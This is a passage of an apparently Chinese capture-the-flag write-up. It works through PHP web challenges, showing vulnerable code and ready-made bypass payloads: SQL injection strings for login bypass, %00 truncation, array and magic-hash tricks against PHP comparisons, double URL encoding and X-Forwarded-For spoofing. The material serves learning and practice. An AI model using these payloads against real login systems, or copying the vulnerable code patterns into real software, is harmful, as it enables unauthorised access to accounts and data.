$key=>$value)&#123; \n\n//遍历数组\n\n    AttackFilter($key,$value,$filter);\n&#125;\n以及返回flag处\n$sql=\"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'\";\n$query = mysql_query($sql); \n\n//执行一条 MySQL 查询\n\nif (mysql_num_rows($query) == 1) &#123; \n\n//返回结果集中行的数目\n\n    $key = mysql_fetch_array($query);\n    if($key['pwd'] == $_POST['pwd']) &#123;\n        print \"CTF&#123;XXXXXX&#125;\";\n这里的话可以看出是要求通过用户名查询处的密码与post上传的密码一致时才会输出flag，查看过WP后了解到with rollup这个东西，在mysql命令行中测试如下\nmysql> select * from users group by id with rollup;\n+----+----------+------------+\n| id | username | password   |\n+----+----------+------------+\n|  1 | Dumb     | Dumb       |\n|  2 | Angelina | I-kill-you |\n|  3 | Dummy    | p@ssword   |\n|  4 | secure   | crappy     |\n|  5 | stupid   | stupidity  |\n|  6 | superman | genious    |\n|  7 | batman   | mob!le     |\n|  8 | admin    | admin      |\n|  9 | admin1   | admin1     |\n| 10 | admin2   | admin2     |\n| 11 | admin3   | admin3     |\n| 12 | dhakkan  | dumbo      |\n| 14 | admin4   | admin4     |\n| NULL | admin4   | admin4     |\n+----+----------+------------+\n14 rows in set (0.00 sec)\n可以发现此时最后一个id是Null，这个算是它的一个特点吧，它自动往后多添了一行，把你group by 的那个变量设为空，其他的变量延续上一个值的，那么我们这里当把查询语句中的id变为password会发生什么呢\nmysql> select * from users group by password with rollup ;\n+----+----------+------------+\n| id | username | password   |\n+----+----------+------------+\n|  9 | admin1   | admin1     |\n| 10 | admin2   | admin2     |\n| 11 | admin3   | admin3     |\n| 14 | admin4   | admin4     |\n|  4 | secure   | crappy     |\n|  1 | Dumb     | Dumb       |\n| 12 | dhakkan  | dumbo      |\n|  6 | superman | genious    |\n|  2 | Angelina | I-kill-you |\n|  7 | batman   | mob!le     |\n|  3 | Dummy    | p@ssword   |\n|  5 | stupid   | stupidity  |\n|  5 | stupid   | NULL       |\n+----+----------+------------+\n13 rows in set (0.00 sec)\n此时你就会发现密码变空了，如果此时登录的话，密码不填，用户名写成‘group by password with rollup --+不就可以绕过了吗（用单引号闭合是因为语句uname = &#39;&#123;$_POST[&#39;uname&#39;]&#125;&#39;），结果是不行，因为这里有语句if (mysql_num_rows($query) == 1)，它只允许有一行返回结果时才往下运行，不过这个也好办，我们用limit就可以了，本地测试如下\nmysql> select * from users group by password with rollup limit 13,1;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  5 | stupid   | NULL     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n所以payload就可以构造出来了\nunname='group by password with rollup limit 13,1--+\npasswd=\nereg正则%00截断&lt;?php \nshow_source(__FILE__);\n$flag = \"flag\";\n\nif (isset ($_GET['password'])) \n&#123;\n  if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)\n  &#123;\n    echo '&lt;p>You password must be alphanumeric&lt;/p>';\n  &#125;\n  else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] > 9999999)\n   &#123;\n     if (strpos ($_GET['password'], '*-*') !== FALSE) //strpos — 查找字符串首次出现的位置\n      &#123;\n      die('Flag: ' . $flag);\n      &#125;\n      else\n      &#123;\n        echo('&lt;p>*-* have not been found&lt;/p>'); \n       &#125;\n      &#125;\n     else \n     &#123;\n        echo '&lt;p>Invalid password&lt;/p>'; \n      &#125;\n   &#125; \n?>\n这里的话有三个条件\n1、 if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === TRUE)\n2、(strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] > 9999999)\n3、  if (strpos ($_GET['password'], '*-*') !== FALSE)\n先看第一个，^表示匹配开头，那么这里的话是^[a-zA-Z0-9]，含义也就是以字母和数字开头，而后有个+，+表示前面的子表达式可匹配多次，在这里也就是说可以有多个字母和数字，结尾是$，在这里的含义就是需要以数字或者字母作为结尾，这里的话正常写就行，看下一个条件\n第二个条件是strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999，密码最多只能写七位，但还需要大于七个9，这个时候怎么办呢，这个时候就要提到PHP中的科学技术法的表示方法了，它的表示方法是1e2这种，这表示1*10的二次方，也就是100,测试如下大家也可自行测试，那么知道了这一点，这里做的话就简单了，我们写个1e8这种就可以绕过了。现在看最后一个条件\n最后一个条件是if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE)，这个其实也就是让password中包含*-*，如果直接写的话，不符合正则表达式的要求，但我们知道当语句遇到%00的时候就会认为是休止符，不再往后看，我们如果在password中添加%00，再添加这个字符串，是不是就可以成功绕过呢，我们构造payload如下进行尝试\npassword=1e8%00*-*\n成功绕过\nstrcmp比较字符串&lt;?php\nshow_source(__FILE__);\n$flag = \"flag\";\nif (isset($_GET['a'])) &#123;  \n    if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 > 0；如果两者相等，返回 0。 \n\n    //比较两个字符串（区分大小写） \n        die('Flag: '.$flag);  \n    else  \n        print 'No';  \n&#125;\n\n?>\n先了解一下strcmp函数\nint strcmp( string $str1, string $str2)\n注意该比较区分大小写。 \n如果 str1 小于 str2 返回 &lt; 0；如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0\n此时就知道了要求相比较的是两个字符串，这里的话如果传入数组的话，会报错，其实也就类似于intval函数，这个函数在 php5.3之前，显示了报错的信息后，将会把这个函数的运算结果输出为Null，此时我们再看这个语句 if (strcmp($_GET[&#39;a&#39;], $flag) == 0)，它是一个弱比较类型，当输出为Null时，也就是if(Null==0)，弱比较类型不看类型，只看值是否相同，那么此时就相当于说Null ==0是成立的，因此我们这里传值为数组就可以成功绕过了\nsha()函数比较绕过&lt;?php\nshow_source(__FILE__);\n$flag = \"flag\";\n\nif (isset($_GET['name']) and isset($_GET['password'])) \n&#123;\n    if ($_GET['name'] == $_GET['password'])\n        echo '&lt;p>Your password can not be your name!&lt;/p>';\n    else if (sha1($_GET['name']) === sha1($_GET['password']))\n      die('Flag: '.$flag);\n    else\n        echo '&lt;p>Invalid password.&lt;/p>';\n&#125;\nelse\n    echo '&lt;p>Login first!&lt;/p>';\n?>\n它这里的话是传入两个变量，name和password，两者经过sha1算法后进行强比较，也就是既比较类型，也比较值，但sha1算法加密的同样是字符串，那就意味着当值为数组时同样会报错，如果我们让两个都报错，那么他们肯定是同种类型的Null，此时就可以绕过，正常的话我们会构造payload如下\nname[]=1&amp;password[]=1\n但是这里还有一个语句就是\nif ($_GET['name'] == $_GET['password'])\n        echo '&lt;p>Your password can not be your name!&lt;/p>';\n也就是要求两者不能一样，不过这个的绕过也简单，我们只需要将两个1随便变一个就可以了，反正结果不受后面数字影响，都是Null，因此构造最终payload如下\nname[]=1&amp;password[]=2\n\nSESSION验证绕过&lt;?php\nshow_source(__FILE__);\n$flag = \"flag\";\n\nsession_start(); \nif (isset ($_GET['password'])) &#123;\n    if ($_GET['password'] == $_SESSION['password'])\n        die ('Flag: '.$flag);\n    else\n        print '&lt;p>Wrong guess.&lt;/p>';\n&#125;\nmt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));\n?>\n条件是$_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;]，这里session中的password是不存在的，需要我们自己传值，那我们如果不传的话不就为Null了吗，此时我们的GET传password也传个空，此时两者是不是就相等了呢，我们尝试一下成功绕过\nunion select注入绕过md5密码&lt;?php\nshow_source(__FILE__);\n//配置数据库\nif($_POST[user] &amp;&amp; $_POST[pass]) &#123;\n    $conn = mysql_connect(\"********, \"*****\", \"********\");\n    mysql_select_db(\"phpformysql\") or die(\"Could not select database\");\n    if ($conn->connect_error) &#123;\n        die(\"Connection failed: \" . mysql_error($conn));\n&#125; \n\n\n$user = $_POST[user];\n$pass = md5($_POST[pass]);\n\n$sql = \"select pw from php where user='$user'\";\n$query = mysql_query($sql);\nif (!$query) &#123;\n    printf(\"Error: %s\\n\", mysql_error($conn));\n    exit();\n&#125;\n$row = mysql_fetch_array($query, MYSQL_ASSOC);\n\n  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;\n\n    echo \"&lt;p>Logged in! Key:************** &lt;/p>\";\n&#125;\nelse &#123;\n    echo(\"&lt;p>Log in failure!&lt;/p>\");\n\n  &#125;\n&#125;\n?>\n条件是  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw])))，而这个$row[pw]是从根据SQL语句从数据库中查询出来的，因此前面这个也就是说要在数据库中存在这个SQL语句对应的密码，而后面的就是校验了，看你输入的密码与数据库是否匹配，这个时候就想到了union select可以自己创一行数据（当然是小白的看法，可能有误，还请师傅们见谅），本地测试如下图\nmysql> select * from users where username='' union select 1,2,3;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | 2        | 3        |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\nmysql> select * from users ;\n+----+----------+------------+\n| id | username | password   |\n+----+----------+------------+\n|  1 | Dumb     | Dumb       |\n|  2 | Angelina | I-kill-you |\n|  3 | Dummy    | p@ssword   |\n|  4 | secure   | crappy     |\n|  5 | stupid   | stupidity  |\n|  6 | superman | genious    |\n|  7 | batman   | mob!le     |\n|  8 | admin    | admin      |\n|  9 | admin1   | admin1     |\n| 10 | admin2   | admin2     |\n| 11 | admin3   | admin3     |\n| 12 | dhakkan  | dumbo      |\n| 14 | admin4   | admin4     |\n+----+----------+------------+\n13 rows in set (0.00 sec)\n从两个查询语句中可以看出，这个union select查询的语句明显是不存在在数据表中的，它取决于我们union select后面输入的东西的\nmysql> select * from users where username='' union select 1,2,database();\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | 2        | security |\n+----+----------+----------+\n1 row in set (0.00 sec)\n那么如果我们用union select的话，这是不是就意味着password可控呢\nmysql> select * from users where username='' union select 1,2,123456;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | 2        | 123456   |\n+----+----------+----------+\n1 row in set (0.00 sec)\n此时查询结果，取出password，那肯定就是123456了，由于密码提交的时候有$pass = md5($_POST[pass]);，所以我们提交123456，到检验时中就变成了e10adc3949ba59abbe56e057f20f883e（md5加密后的123456），那我们这个时候不就无法做到对应了吗，不过我们是不是可以把md5加密后的密码放到SQL语句中呢，这样比对的时候不就一致了吗，因此构造payload如下\nuser=' union select 1,2,'e10adc3949ba59abbe56e057f20f883e' #\n&amp;password=123456\nurldecode二次编码绕过&lt;?php\nshow_source(__FILE__);\nif(eregi(\"hackerDJ\",$_GET[id])) &#123;\n  echo(\"&lt;p>not allowed!&lt;/p>\");\n  exit();\n&#125;\n\n$_GET[id] = urldecode($_GET[id]);\nif($_GET[id] == \"hackerDJ\")\n&#123;\n  echo \"&lt;p>Access granted!&lt;/p>\";\n  echo \"&lt;p>flag: *****************&#125; &lt;/p>\";\n&#125;\n?>\n简单读一下代码就可以知道这道题条件是\n1、id参数不能为hackerDJ\n2、id参数经过url解码后为hackerDJ\n这个时候思路就比较明确了，那就是给id参数赋值为hackerDJ然后进行url编码，但服务端接受参数时会自动进行一次编码，我们如果只编码一次的话还是绕不过去，因此这里需要进行二次编码，一般的工具url编码无法实现，这里可以借助burpsuite来实现，burpsuite可以实现全编码构造最终payload如下\nid=%2568%2561%2563%256b%2565%2572%2544%254a\n\nsql闭合绕过&lt;?php\nshow_source(__FILE__);\n\nif($_POST[user] &amp;&amp; $_POST[pass]) &#123;\n    $conn = mysql_connect(\"*******\", \"****\", \"****\");\n    mysql_select_db(\"****\") or die(\"Could not select database\");\n    if ($conn->connect_error) &#123;\n        die(\"Connection failed: \" . mysql_error($conn));\n&#125; \n$user = $_POST[user];\n$pass = md5($_POST[pass]);\n\n$sql = \"select user from php where (user='$user') and (pw='$pass')\";\n$query = mysql_query($sql);\nif (!$query) &#123;\n    printf(\"Error: %s\\n\", mysql_error($conn));\n    exit();\n&#125;\n$row = mysql_fetch_array($query, MYSQL_ASSOC);\n\n  if($row['user']==\"admin\") &#123;\n    echo \"&lt;p>Logged in! Key: *********** &lt;/p>\";\n  &#125;\n\n  if($row['user'] != \"admin\") &#123;\n    echo(\"&lt;p>You are not admin!&lt;/p>\");\n  &#125;\n&#125;\n\n?>\n两个条件\n1、语句不能报错，需要有查询结果\n2、传入的user参数需要为admin\n那么这就相当于给出了用户名为admin，让你提交密码，只有密码正确的时候才可以使得结果不报错，从而回显flag，但我们不知道密码，此时想到另一种方式，用注释符#闭合语句是不是也可以使得结果不报错呢，我们本地测试一下\nmysql> select * from users where (username='admin') and (password='admin');\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  8 | admin    | admin    |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\nmysql> select * from users where (username='admin');#;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  8 | admin    | admin    |\n+----+----------+----------+\n1 row in set (0.00 sec)\n可以发现是可以正常查询的，有查询结果，但此时如果我们用#闭合的话，此时语句就是\n$sql = \"select user from php where (user='admin#') and (pw='$pass')\";\n等同于\n$sql = \"select user from php where (user='admin\n不难看出语句是有问题的，需要进行闭合，因此我们需要添加上&#39;)，构造最终payload如下\nusername=admin')#\n此时语句就是\n$sql = \"select user from php where (user='admin')\nX-Forwarded-For绕过指定IP地址&lt;?php\nshow_source(__FILE__);\nfunction GetIP()&#123;\nif(!empty($_SERVER[\"HTTP_CLIENT_IP\"]))\n    $cip = $_SERVER[\"HTTP_CLIENT_IP\"];\nelse if(!empty($_SERVER[\"HTTP_X_FORWARDED_FOR\"]))\n    $cip = $_SERVER[\"HTTP_X_FORWARDED_FOR\"];\nelse if(!empty($_SERVER[\"REMOTE_ADDR\"]))\n    $cip = $_SERVER[\"REMOTE_ADDR\"];\nelse\n    $cip = \"0.0.0.0\";\nreturn $cip;\n&#125;\n\n$GetIPs = GetIP();\nif ($GetIPs==\"1.1.1.1\")&#123;\necho \"Great! Key is *********\";\n&#125;\nelse&#123;\necho \"错误！你的IP不在访问列表之内！\";\n&#125;\n?>\n做这道题之前不妨先了解一下HTTP_CLIENT_IP、X_FORWARDED_FOR和REMOTE_ADDR\nHTTP_CLIENT_IP 是代理服务器发送的HTTP头\nHTTP_CLIENT_IP 是代理服务器发送的HTTP头，HTTP_CLIENT_IP确实存在于http请求的header里。\nX_FORWARDED_FOR\n\n\n\n\n\n\n\n\n\n简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP代理或者负载均衡服务器时才会添加该项，正如上面所述,当你使用了代理时,web服务器就不知道你的真实IP了,为了避免这个情况,代理服务器通常会增加一个叫做x_forwarded_for的头信息,把连接它的客户端IP(即你的上网机器IP)加到这个头信息里,这样就能保证网站的web服务器能获取到真实IP\nREMOTE_ADDR\n\n\n\n\n\n\n\n\n\n表示发出请求的远程主机的 IP地址，remote_addr代表客户端的IP，但它的值不是由客户端提供的，而是服务端根据客户端的ip指定的，当你的浏览器访问某个网站时，假设中间没有任何代理，那么网站的web服务器（Nginx，Apache等）就会把remote_addr设为你的机器IP，如果你用了某个代理，那么你的浏览器会先访问这个代理，然后再由这个代理转发到网站，这样web服务器就会把remote_addr设为这台代理机器的IP\n简单的总结一下就是\n$_SERVER['REMOTE_ADDR']; //访问端（有可能是用户，有可能是代理的）IP\n$_SERVER['HTTP_CLIENT_IP']; //代理端的（有可能存在，可伪造）\n$_SERVER['HTTP_X_FORWARDED_FOR']; //用户是在哪个IP使用的代理（有可能存在，也可以伪造）\n\n具体参考文献https://www.cnblogs.com/luxiaojun/p/10451860.htmlhttps://www.cnblogs.com/isungge/p/5711031.html因此我们这里的话可以尝试伪造XFF头来进行绕过\nmd5加密相等绕过&lt;?php\nshow_source(__FILE__);\n$md51 = md5('QNKCDZO');\n$a = @$_GET['a'];\n$md52 = @md5($a);\nif(isset($a))&#123;\nif ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123;\n    echo \"nctf&#123;*****************&#125;\";\n&#125; else &#123;\n    echo \"false!!!\";\n&#125;&#125;\nelse&#123;echo \"please input a\";&#125;\n\n?>\n两个条件\n$a != 'QNKCDZO'\nmd5($_GET['a'])==md5('QNKCDZO');\n我们不妨先看一下md5加密后的QNKCDZO的值\n0e830400451993494058024219903391\n按照PHP的算法，这种会被认为是科学计数法，这里也会被视为0*10的830400451993494058024219903391次方，0乘任何都为0，这里要求的是两个=，也就是弱比较，此时只需要满足值相同就可以绕过，也就是说我们只需要再找一个满足md5加密后值为0exxx即可，这种数有很多，这里随便列出几个\ns155964671a\ns214587387a\ns1091221200a\ns1502113478a\ns1665632922a\n构造最终payload如下\na=s1665632922a\n\n\nintval函数四舍五入&lt;?php\nshow_source(__FILE__);\nif($_GET[id]) &#123;\n   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);\n  mysql_select_db(SAE_MYSQL_DB);\n  $id = intval($_GET[id]);\n  $query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\"));\n  if ($_GET[id]==1024) &#123;\n      echo \"&lt;p>no! try again&lt;/p>\";\n  &#125;\n  else&#123;\n    echo($query[content]);\n  &#125;\n&#125;\n?>\n学习intval函数可以看我的这篇文章，之前针对这个intval做过一个简单的总结https://www.quan9i.top/2022/05/15/php特性之intval学习小记接下来开始说一下这道题\nmysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);\n这个呢，其实就是PHP连接SAE平台mysql的，我们理解为连接数据库即可，接着看整体看过后，发现重点大致是这几句\n1 、$id = intval($_GET[id]);\n$query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\"));\n2、if($_GET[id]==1024)\n第二个语句是$_GET[id]不等于1024时才往下执行，但好端端的为什么要提到这个1024呢，往下运行是输出查询结果，这是不是间接的说明id为1024时对应的内容为flag呢，因此我们这里去构造一个1024即可，但等于1024又无法往下运行，这个时候就关注到了查询语句中是$id，而$id是intval($_GET[id])，因此这里就可以用intval的几个特性来绕过了从官方例子中也可以看出，小数点后不计，那我们这里传值1024.2，在查询时不也是1024吗，而且后面检测是否为1024时还可以绕过检测，因此最终payload为\nid=1024.2\nstrpos数组绕过NULL与ereg正则%00截断&lt;?php\nshow_source(__FILE__);\n$flag = \"flag\";\n\n    if (isset ($_GET['nctf'])) &#123;\n        if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE)\n            echo '必须输入数字才行';\n        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   \n            die('Flag: '.$flag);\n        else\n            echo '骚年，继续努力吧啊~';\n    &#125;\n\n ?>\n可以看到这里的话是两个条件\n1、@ereg (\"^[1-9]+$\", $_GET['nctf']) === TRUE\n2、strpos ($_GET['nctf'], '#biubiubiu') !== FALSE\n简单的说其实就是这个nctf参数只能由数字组成，但想要flag就需要在参数nctf中出现#biubiubiu，因此这里的话我们就需要用到之前的知识了，\n%00截断当语句遇到%00时，会认为是休止符，不再往后看，即使后面还有语句因此这里的话我们可以在给nctf进行赋值时，加上%00，然后后面加上我们的#biubiubiu，此时就可以成功绕过，构造最终payload如下\nnctf=1%00%23biubiubiu\n数组绕过前面做题时也提到过，当函数中要求的是字符串时，我们提交的如果是数组，那么就会报错，然后返回Null，这里的话我们看一下strpos函数要求的同样是字符串，我们填数组的话会报出Null，此时它的第二个条件就变成了\nNull !==FALSE\n这个条件是满足的，因为!==是强比较，不仅比较值，还比较类型，我们也可以自己本地测试一下\n&lt;?php\nshow_source(__FILE__);\necho '&lt;br>';\nvar_dump(null != false);\necho '&lt;br>';\nvar_dump(null !== false);\n?>\n因此我们构造的最终payload如下\nnctf[]=1\n\nSQL注入or绕过&lt;?php\nshow_source(__FILE__);\n#GOAL: login as admin,then get the flag;\nerror_reporting(0);\nrequire 'db.inc.php';\n\nfunction clean($str)&#123;\n    if(get_magic_quotes_gpc())&#123; //get_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置\n        $str=stripslashes($str); //返回一个去除转义反斜线后的字符串（\\' 转换为 ' 等等）。双反斜线（\\\\）被转换为单个反斜线（\\）。 \n    &#125;\n    return htmlentities($str, ENT_QUOTES);\n&#125;\n\n$username = @clean((string)$_GET['username']);\n$password = @clean((string)$_GET['password']);\n\n$query='SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';';\n$result=mysql_query($query);\nif(!$result || mysql_num_rows($result) &lt; 1)&#123;\n    die('Invalid password!');\n&#125;\n\necho $flag;\n\n?>\n条件\n(!$result || mysql_num_rows($result) &lt; 1)==false\n这个的话也就是说有查询结果，且结果不为空时就可以输出flag，代码第三行有注释\n#GOAL: login as admin,then get the flag;\n得到用户名为admin，此时看SQL注入语句\n$query='SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';';\n这两个变量username和password都被clean函数包裹，clean函数简单看一下\nfunction clean($str)&#123;\n    if(get_magic_quotes_gpc())&#123; //get_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置\n        $str=stripslashes($str); //返回一个去除转义反斜线后的字符串（\\' 转换为 ' 等等）。双反斜线（\\\\）被转换为单个反斜线（\\）。 \n    &#125;\n    return htmlentities($str, ENT_QUOTES);\n&#125;\n了解到是当满足get_magic_quotes_gpc()时，此时会去除转义，否则返回转义后的结果，现在来看一下这个get_magic_quotes_gpc()函数这里看的话始终返回false，因此这里就对单引号、双引号进行了转义，因此变量中是不能通过单引号或者双引号实现闭合从而进行SQL注入了，但\\未在转义范围内，我们此时就可以利用\\来影响原SQL语句，这里将SQL语句列出\n$query='SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';';\n此时我们不知道密码，肯定要对后面进行点什么，这里的思路的话就是让AND pass这句话变成一部分，此时后面随便写，比如万能语句or 1#使得语句不报错即可，那我们该怎么来实现呢，当然是借助\\，在name传值时后面加一个\\就可以实现，构造payload如下\nname=admin\\#&amp;password= or 1#\n此时语句就是\n$query='SELECT * FROM users WHERE name=\\''admin\\'\\' AND pass=\\''or 1#'\\';';\n//name=\\''admin\\'为一部分\n//\\' AND pass=\\'为一部分\n//or 1#为最后一部分\n其实简化一下也就是\n$query='SELECT * FROM users WHERE name='admin AND pass=' or 1#'\n你会发现此时AND pass变成了name的一部分，后面不报错，此时就符号条件，语句就可以正常运行，此时就可以得到flag了，因此构造最终payload如下\nname=admin\\#&amp;password= or 1#\n密码md5比较绕过&lt;?php\n\nif($_POST[user] &amp;&amp; $_POST[pass]) &#123;\n   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);\n  mysql_select_db(SAE_MYSQL_DB);\n  $user = $_POST[user];\n  $pass = md5($_POST[pass]);\n  $query = @mysql_fetch_array(mysql_query(\"select pw from ctf where user=' $user '\"));\n  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;\n\n    //strcasecmp:0 - 如果两个字符串相等\n\n      echo \"&lt;p>Logged in! Key: ntcf&#123;**************&#125; &lt;/p>\";\n  &#125;\n  else &#123;\n    echo(\"&lt;p>Log in failure!&lt;/p>\");\n  &#125;\n&#125;\n\n?>\n同之前的union select注入绕过一致，这里直接给出payload\nuser='union select 1,2,'e10adc3949ba59abbe56e057f20f883e'#\n&amp;pass=123456\nmd5()函数===使用数组绕过&lt;?php\nshow_source(__FILE__);\nerror_reporting(0);\n$flag = 'flag&#123;test&#125;';\nif (isset($_GET['username']) and isset($_GET['password'])) &#123;\n    if ($_GET['username'] == $_GET['password'])\n        print 'Your password can not be your username.';\n    else if (md5($_GET['username']) === md5($_GET['password']))\n        die('Flag: '.$flag);\n    else\n        print 'Invalid password';\n&#125;\n?>\n条件\nmd5($_GET['username']) === md5($_GET['password']\n这里看的话是强比较，因此构造都为0exxx的那种是无法绕过的，但我们绕过的方式还有一种就是数组绕过，当函数应该用字符串时用数组，此时都会返回Null，值和类型都是相同的，因此构造payload如下\nusername[]=1\n&amp;password[]=2\n\nereg()函数strpos() 函数用数组返回NULL绕过&lt;?php  \nshow_source(__FILE__);\n$flag = \"flag\";  \n   \nif (isset ($_GET['password'])) &#123;  \n    if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)  \n        echo 'You password must be alphanumeric';  \n    else if (strpos ($_GET['password'], '--') !== FALSE)  \n        die('Flag: ' . $flag);  \n    else  \n        echo 'Invalid password';  \n&#125;  \n?>\n这里的话简单读一下代码就是password只允许为字母和数字，但只有出现–时才能输出flag，思路明显，用%00截断或者数组绕过\n%00截断语句遇到%00就认为是休止符，不再往后看\npassword=1%00--\n\n数组绕过比较的是字符串，当我们传入数组时，就会返回Null，此时语句就变成了\nif(Null !==False)\n这个是成立的，因为这里是强比较，因此此时就会输出flag，所以我们构造最终payload如下\npassword[]=1\n十六进制与数字比较&lt;?php\nshow_source(__FILE__);\nerror_reporting(0);\nfunction noother_says_correct($temp)\n&#123;\n    $flag = 'flag&#123;test&#125;';\n    $one = ord('1');  //ord — 返回字符的 ASCII 码值\n    $nine = ord('9'); //ord — 返回字符的 ASCII 码值\n    $number = '3735929054';\n    // Check all the input characters!\n    for ($i = 0; $i &lt; strlen($number); $i++)\n    &#123; \n        // Disallow all the digits!\n        $digit = ord($temp&#123;$i&#125;);\n        if ( ($digit >= $one) &amp;&amp; ($digit &lt;= $nine) )\n        &#123;\n            // Aha, digit not allowed!\n            return \"flase\";\n        &#125;\n    &#125;\n    if($number == $temp)\n        return $flag;\n&#125;\n$temp = $_GET['password'];\necho noother_says_correct($temp);\n\n?>\n条件\n1、if ( ($digit >= $one) &amp;&amp; ($digit &lt;= $nine) )为false\n2、if($number == $temp)\n简单的读一下这个自定义函数的话就会发现它这里其实是不让输入数字，但是结果又需要password与这串数字3735929054相等，此时就想到进制转换，里面有9，肯定不是八进制，因此此时考虑十六进制，转换一下看看\n&lt;?php\necho dechex(3735929054);//进行十六进制转换\n?>\n得到deadc0de，那我们如果用十六进制的它与十进制的它作比较，两者肯定是相同的，因此我们构造payload如下\npassword=0xdeadc0de\n\n数字验证正则绕过&lt;?php\nshow_source(__FILE__);\nerror_reporting(0);\n$flag = 'flag&#123;test&#125;';\nif  (\"POST\" == $_SERVER['REQUEST_METHOD']) \n&#123; \n    $password = $_POST['password']; \n    if (0 >= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password)) //preg_match — 执行一个正则表达式匹配\n    &#123; \n        echo 'Wrong Format'; \n        exit; \n    &#125; \n    while (TRUE) \n    &#123; \n        $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; \n        if (6 > preg_match_all($reg, $password, $arr)) \n            break; \n        $c = 0; \n        $ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母 \n        foreach ($ps as $pt) \n        &#123; \n            if (preg_match(\"/[[:$pt:]]+/\", $password)) \n                $c += 1; \n        &#125; \n        if ($c &lt; 3) break; \n        //>=3，必须包含四种类型三种与三种以上\n        if (\"42\" == $password) echo $flag; \n        else echo 'Wrong password'; \n        exit; \n    &#125; \n&#125;\n\n?>\n关注点\n1、 if (0 >= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password))\n2、 $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; \n        if (6 > preg_match_all($reg, $password, $arr)) \n3、  if ($c &lt; 3) break;\n4、 if (\"42\" == $password) echo $flag; \n第一个：至少匹配13次才能使得if语句为false，此时语句才能继续往下运行，因此也就是说password长度要大于12位第二个：password中匹配到的标点符号，大小写字母和数字要大于六次第三个： if ($c &lt; 3)表示包含至少要有三种类型，即大写字母、小写字母、标点符号等等中至少要有三种类型第四个：password要等于42才能输出结果结合第三个和第四个，此时我们想到小数点后用科学计数法来表示password，构造payload如下\npassword=42.000000000e-0\n弱类型整数大小比较绕过&lt;?php\nshow_source(__FILE__);\nerror_reporting(0);\n$flag = \"flag&#123;test&#125;\";\n\n$temp = $_GET['password'];\nis_numeric($temp)?die(\"no numeric\"):NULL;    \nif($temp>1336)&#123;\n    echo $flag;\n&#125; \n\n?>\n这里的话要求不能是纯数字而且要求数字大于1336，这里就需要说一个小trick了，当字符型和整数相比较时，会经过intval函数处理，所以这里我们可以用后面加字母来进行绕过\npassword=1337a\n当然，也可以用%00截断，此时也是不仅仅有数字的\npassword=1337%00\n还有数组方式我也发现可以绕过，payload如下\npassword[]=1\n这里的话数组不是数字，前面肯定满足，后面的这个if($temp&gt;1336)是怎么比较的呢，当数组和数字进行比较时，数组是一定大于数字的（PHP内部规定），具体可以参考这篇文章https://www.cnblogs.com/F4NNIU/p/13571893.html\nmd5函数验证绕过&lt;?php\nshow_source(__FILE__);\nerror_reporting(0);\n$flag = 'flag&#123;test&#125;';\n$temp = $_GET['password'];\nif(md5($temp)==0)&#123;\n    echo $flag;\n&#125;\n\n?>\n弱比较类型，让其加密后为0exxx这种格式即可，或者用数组来绕过构造payload如下\npassword[]=1\npassword=s155964671a\nmd5函数true绕过注入&lt;?php \nshow_source(__FILE__);\nerror_reporting(0);\n$link = mysql_connect('localhost', 'root', 'root');\nif (!$link) &#123; \n  die('Could not connect to MySQL: ' . mysql_error()); \n&#125; \n// 选择数据库\n$db = mysql_select_db(\"security\", $link);\nif(!$db)\n&#123;\n  echo 'select db error';\n  exit();\n&#125;\n// 执行sql\n$password = $_GET['password'];\n$sql = \"SELECT * FROM users WHERE password = 